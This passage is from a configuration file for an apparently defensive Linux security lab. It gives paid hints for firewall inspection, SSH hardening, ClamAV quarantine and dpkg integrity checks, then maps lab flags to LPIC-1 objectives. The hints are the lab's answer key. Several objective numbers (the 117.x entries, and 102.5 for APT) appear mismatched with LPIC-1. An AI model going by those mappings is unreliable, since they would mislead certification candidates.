            text: 'Start with the firewall: sudo iptables -L -n -v to see the current policy. Then sudo ss -tlnp to find what ports are listening (including the rogue one). Your notes.txt has the full checklist.',
            cost: 50,
            penalty: -50
        },
        {
            id: 'hint2',
            text: 'For SSH hardening: nano /etc/ssh/sshd_config, change PermitRootLogin yes to PermitRootLogin no, then run sshd -t && systemctl reload sshd. Check /var/log/auth.log for which account was exploited.',
            cost: 50,
            penalty: -50
        },
        {
            id: 'hint3',
            text: 'For the malware: sudo clamscan -r -i --move=/var/quarantine /tmp /home. For the tampered package: sudo dpkg -V openssh-server. A "5" in the output means the file checksum does not match.',
            cost: 50,
            penalty: -50
        }
    ],

    // ═══════════════════════════════════════════════════════
    // CERT OBJECTIVES
    // ═══════════════════════════════════════════════════════

    certObjectives: {
        certPath: 'LPI-LPIC-1',
        mappings: [
            { flagId: 'cmd1', objective: '117.1', description: 'Manage security with iptables', skill: 'Firewall rule inspection and default-deny policy configuration' },
            { flagId: 'cmd4', objective: '117.2', description: 'Implement host-based firewall', skill: 'Socket statistics and rogue service identification' },
            { flagId: 'cmd5', objective: '110.3', description: 'Securing data with encryption', skill: 'SSH daemon hardening via sshd_config' },
            { flagId: 'cmd6', objective: '110.2', description: 'Setup host security', skill: 'PAM account lockout and failed login auditing' },
            { flagId: 'cmd7', objective: '117.3', description: 'Protect files and directories', skill: 'ClamAV recursive scan and quarantine workflow' },
            { flagId: 'cmd8', objective: '102.5', description: 'Use APT package management', skill: 'dpkg package integrity verification against MD5 checksums' }
        ]
    }

};
